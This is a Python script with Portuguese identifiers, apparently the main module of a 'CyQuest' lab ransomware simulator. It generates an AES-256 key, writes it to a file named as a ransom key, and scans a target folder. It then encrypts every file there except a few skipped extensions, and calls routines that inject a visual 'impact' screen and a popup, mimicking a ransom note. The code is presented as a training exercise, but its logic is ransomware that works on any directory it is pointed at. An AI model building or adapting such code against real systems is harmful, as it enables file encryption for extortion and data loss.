import os
import time
from pathlib import Path

from varredura_de_arquivo import escanear_diretorio
from criptografia import criptografar_arquivo
from interface import injetar_impacto_visual, disparar_popup


EXTENSOES_IGNORADAS = {
    ".cyquest",   
    ".key",       
    ".py",        
    ".exe",
    ".dll"
}


def deve_ignorar(caminho: Path):
    """Evita criptografar arquivos sensíveis do próprio laboratório"""
    if caminho.suffix.lower() in EXTENSOES_IGNORADAS:
        return True

    if "chave_resgate.key" in caminho.name:
        return True

    return False


def executar_teste_laboratorio():

    print("\n===== CYQUEST LAB SIMULATOR =====\n")

    inicio = time.time()

    diretorio_alvo = os.path.abspath("./laboratorio_teste")

    if not os.path.exists(diretorio_alvo):
        print(f"[-] Crie a pasta {diretorio_alvo} com arquivos de teste.")
        return


    chave_mestra = os.urandom(32)

    with open("chave_resgate.key", "wb") as key_file:
        key_file.write(chave_mestra)

    print("[+] Chave AES-256 gerada")

   
    print("[*] Escaneando diretório...")
    arquivos_encontrados = escanear_diretorio(diretorio_alvo)

    total_encontrados = 0
    total_criptografados = 0
    erros = 0

 
    for categoria, lista_paths in arquivos_encontrados.items():

        if not lista_paths:
            continue

        print(f"\n[+] Categoria encontrada: {categoria} ({len(lista_paths)} arquivos)")

        for caminho in lista_paths:
            total_encontrados += 1

            if deve_ignorar(caminho):
                print(f"[IGNORADO] {caminho.name}")
                continue

            try:
                print(f"[CRIPT] {caminho.name}")
                criptografar_arquivo(str(caminho), chave_mestra)
                total_criptografados += 1

            except Exception as e:
                print(f"[ERRO] {caminho.name}: {e}")
                erros += 1

  
    print("\n[*] Aplicando interface de impacto...")
    injetar_impacto_visual(diretorio_alvo)
    disparar_popup()



executar_teste_laboratorio();